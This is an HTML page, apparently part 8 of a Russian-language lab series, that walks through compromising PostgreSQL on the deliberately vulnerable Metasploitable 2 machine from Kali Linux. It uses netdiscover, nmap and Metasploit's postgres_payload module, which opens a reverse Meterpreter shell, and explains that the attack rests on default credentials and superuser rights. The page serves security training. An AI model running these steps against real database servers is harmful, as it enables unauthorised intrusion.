@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Экспулатация уязвимости PostgreSQL в metasploitable-linux-2.0.0</title>
+
+	<meta name="DESCRIPTION" content="Экспулатация уязвимости PostgreSQL в metasploitable-linux-2.0.0">
+	<meta name="KEYWORDS" content="Экспулатация уязвимости PostgreSQL в metasploitable-linux-2.0.0">
+
+  <meta property="og:url"                content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2h.html" />
+  <meta property="og:type"               content="article" />
+  <meta property="og:title"              content="Ed Kurlyak - Экспулатация уязвимости PostgreSQL в metasploitable-linux-2.0.0" />
+  <meta property="og:description"        content="Экспулатация уязвимости PostgreSQL в PostgreSQL в metasploitable-linux-2.0.0" />
+  <meta property="og:image"              content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2.png" />
+
+<style type="text/css">
+body {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #000;
+	color: #ffffff;
+}
+
+pre {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #ffffaa;
+	color: #000;
+	width: max-content;
+	min-width: 100%;
+
+}
+
+div.my_selected {
+	width: 100%;
+	background-color: #ffff55;
+	position: relative;
+}
+
+a:link, a:visited { color: #aaaaaa; text-decoration: none; font-weight: normal;} 
+a:active, a:hover { color: #aaaaaa; text-decoration: underline;}
+
+p {
+	text-align: justify;
+	margin-right: 20px;
+}
+
+</style>	
+</head>
+<body>
+
+<h3>
+Часть 8. Экспулатация уязвимости PostgreSQL в metasploitable-linux-2.0.0
+</h3>
+
+<p>
+Предполагается что все действия выполняются на виртуальных машинах VirtualBox.
+</p>
+
+<p>
+Сначала необходимо обновить metasploit, так как необходимый payload не стабильно работает на текущей версии. Что бы обновить metasploit в терминале Kali Linux необходимо дать команду:
+</p>
+
+<pre>
+
+sudo apt update
+sudo apt install metasploit-framework
+
+</pre>
+
+<p>
+Необходимо определить IP с машиной Metasploitable 2. Для этого сначала определим наш IP и маску подсети, для этого дадим команду в терминале Kali:
+</p>
+
+<p>
+ifconfig
+</p>
+
+<p>
+В результатах вывода команды выше, можно увидеть такую строку:
+</p>
+
+<p>
+inet 10.0.2.4  netmask 255.255.255.0 
+</p>
+
+<p>
+То есть наш IP 10.0.2.4 а диапазон IP адресов нашей сети 10.0.2.0/24 (это обяснялось ранее в предыдущих статьях).
+</p>
+
+<p>
+Для обнаружения других компьютеров в сети и в том числе нашей удаленной машины Metasploitable 2, дадим команду в терминале Kali:
+</p>
+
+<p>
+sudo netdiscover -r 10.0.2.0/24
+</p>
+
+<p>
+В выводе команды:
+</p>
+
+<p>
+10.0.2.2        08:00:27:3a:17:ed      1      60  PCS Systemtechnik GmbH
+10.0.2.3        08:00:27:f1:18:5a      1      60  PCS Systemtechnik GmbH
+</p>
+
+<p>
+10.0.2.2 - это виртуальный роутер, который управляет нашей сетью.
+</p>
+
+<p>
+10.0.2.3 - это наша машина (по логике) с Metasploitable 2.
+</p>
+
+<p>
+Проверим связь между нашей Kali и удаленной ВМ Metasploitable 2, дадим команду:
+</p>
+
+<p>
+ping 10.0.2.3
+</p>
+
+<p>
+Если сеть в VirtualBox настроена правильно, видим пинг идет, связь есть.
+</p>
+
+<p>
+На Kali выполняем команду в терминале:
+</p>
+
+<p>
+nmap -sC -sV 10.0.2.3
+</p>
+
+<p>
+В выводе nmap находим такую строку (сриншот ниже):
+</p>
+
+<p>
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+</p>
+
+
+<img src="./pich/pic96.jpg" width=1400 alt="kali linux терминал вывод команды nmap">
+
+<p>
+Теперь на Kali в терминале даем команду запуска метасплоит:
+</p>
+
+<p>
+msfconsole
+</p>
+
+
+<p>
+Далее даем команду
+</p>
+
+
+
+<p>
+
+msf > search postgres
+<br>
+msf > use exploit/linux/postgres/postgres_payload
+<br>
+msf exploit(postgres_payload) > set RHOST 10.0.2.3
+<br>
+msf exploit(postgres_payload) > set LHOST 10.0.2.4
+<br>
+msf exploit(postgres_payload) > exploit
+</p>
+
+<p>
+Теперь запустилась сессия meterpreter и мы внутри Metasploitable 2.
+</p>
+
+<img src="./pich/pic97.jpg" width=1400 alt="kali linux терминал msfconsole exploit">
+
+
+<p>
+Что значит в выводе nmap
+</p>
+
+<p>
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+</p>
+
+<p>
+Строка
+</p>
+
+<p>
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+</p>
+
+<p>
+состоит из нескольких частей.
+</p>
+
+
+<pre>
+
+Часть							Что означает
+5432/tcp						На порту 5432 по протоколу TCP работает какой-то сервис. Это стандартный порт PostgreSQL.
+open							Порт открыт и принимает подключения.
+postgresql						Nmap определил, что это сервер PostgreSQL.
+PostgreSQL DB 8.3.0 - 8.3.7		Nmap предполагает, что версия сервера находится в диапазоне от 8.3.0 до 8.3.7.
+
+</pre>
+
+
+<p>
+PostgreSQL — это система управления базами данных (СУБД), то есть программа, которая хранит и обрабатывает базы данных.
+</p>
+
+
+<p>
+Иногда по ответу nmap невозможно определить одну конкретную версию, поэтому Nmap пишет диапазон.
+</p>
+
+<p>
+То есть:
+</p>
+
+<p>
+PostgreSQL DB 8.3.0 - 8.3.7
+</p>
+
+<p>
+означает:
+</p>
+
+<p>
+«По имеющимся признакам это PostgreSQL версии не ниже 8.3.0 и не выше 8.3.7.»
+</p>
+
+<p>
+Это не означает, что одновременно установлены все эти версии.
+</p>
+
+<p>
+Если выполнить команду метасплоит show options можно увидеть что в настройках указано database = postgres, username = postgres, password = postgres.
+</p>
+
+<p>
+msf exploit(linux/postgres/postgres_payload) > show options
+</p>
+
+
+<p>
+Таким образом модуль:
+</p>
+
+<p>
+exploit/linux/postgres/postgres_payload
+</p>
+
+<p>
+предназначен для эксплуатации PostgreSQL, если у атакующего уже есть возможность войти в базу данных (обычно известны логин и пароль).
+</p>
+
+<p>
+Модуль не взламывает пароль, а использует существующий доступ к PostgreSQL для выполнения команд на сервере.
+</p>
+
+<p>
+Командой:
+</p>
+
+<p>
+msf exploit(postgres_payload) > exploit
+</p>
+
+<p>
+Запускается эксплуатация.
+</p>
+
+<p>
+Metasploit делает примерно следующее:
+</p>
+
+<ul>
+<li>Подключается к PostgreSQL.</li>
+<li>Авторизуется.</li>
+<li>Загружает небольшой исполняемый файл (payload).</li>
+<li>Заставляет PostgreSQL выполнить этот файл.</li>
+<li>Получает удаленную оболочку Meterpreter.</li>
+</ul>
+
+<p>
+Почему PostgreSQL вообще может выполнять программы?
+</p>
+
+<p>
+PostgreSQL имеет встроенные функции для работы с операционной системой.
+</p>
+
+<p>
+Например, можно создавать функции на языке C, загружать библиотеки, запускать некоторые внешние процессы и использовать расширения.
+</p>
+
+<p>
+Если пользователь PostgreSQL обладает достаточно высокими привилегиями (например, является суперпользователем базы), это может привести к выполнению кода на уровне операционной системы.
+</p>
+
+<p>
+Именно этим и пользуется модуль.
+</p>
+
+<p>
+Почему это работает на Metasploitable 2?
+</p>
+
+
+<p>
+Metasploitable 2 специально настроена как уязвимая лабораторная машина.
+</p>
+
+<p>
+Обычно:
+</p>
+
+<ul>
+<li>PostgreSQL установлен;</li>
+<li>пароль очень простой;</li>
+<li>пользователь базы имеет максимальные права;</li>
+<li>нет современных механизмов защиты.</li>
+</ul>
+
+<p>
+В реальной системе такое встречается значительно реже.
+</p>
+
+<p>
+Что такое Meterpreter?
+</p>
+
+<p>
+Meterpreter — это специальная интерактивная оболочка Metasploit.
+</p>
+
+<p>
+После успешной эксплуатации вместо обычного shell вы получаете более мощный инструмент.
+</p>
+
+<p>
+Например, можно:
+</p>
+
+<ul>
+<li>выполнять команды Linux;</li>
+<li>загружать и скачивать файлы;</li>
+<li>получать информацию о системе;</li>
+<li>создавать дополнительные соединения;</li>
+<li>запускать новые процессы;</li>
+<li>повышать привилегии (если есть соответствующие уязвимости).</li>
+</ul>
+
+
+<p>
+В нашем примере предполагается, что перед запуском этого модуля уже были получены учетные данные PostgreSQL (например, логин postgres и простой пароль вроде postgres или password). Сам модуль exploit/linux/postgres/postgres_payload не подбирает пароль и не использует уязвимость в протоколе PostgreSQL — он использует уже имеющийся привилегированный доступ к базе для выполнения кода на сервере. Именно поэтому он работает на учебной машине Metasploitable 2, где намеренно оставлены небезопасные настройки.
+</p>
+
+<p>
+То есть сам модуль postgres_payload не подбирает пароль и не ломает защиту PostgreSQL. Он использует уже имеющийся доступ и особенности или небезопасную конфигурацию сервера для выполнения кода.
+</p>
+
+<p>
+Почему именно postgres_payload?
+</p>
+
+<p>
+Потому что разведка nmap показала:
+</p>
+
+<p>
+5432/tcp open postgresql
+</p>
+
+<p>
+Затем выяснилось (или было известно заранее), что:
+</p>
+
+<p>
+есть доступ к PostgreSQL;
+<br>
+пользователь обладает необходимыми правами.
+</p>
+
+
+<p>
+Модуль postgres_payload как раз предназначен для выполнения кода через PostgreSQL при наличии такого доступа.
+</p>
+
+<p>
+То есть выбор postgres_payload основан не на угадывании, а на информации, полученной в ходе разведки, и на изучении доступных модулей Metasploit.
+</p>
+
+<p>
+Мы подключаемся к PostgreSQL с привилегированной учетной записью, используем возможности PostgreSQL для запуска кода на уровне операционной системы, и этот код устанавливает обратное соединение с атакующей машиной, в результате чего получаем сессию Meterpreter.
+</p>
+
+<p>
+Именно поэтому после успешной эксплуатации Meterpreter получает права того пользователя Linux, от имени которого работает процесс PostgreSQL (часто это пользователь postgres).
+</p>
+
+
+
+</body>
+</html>
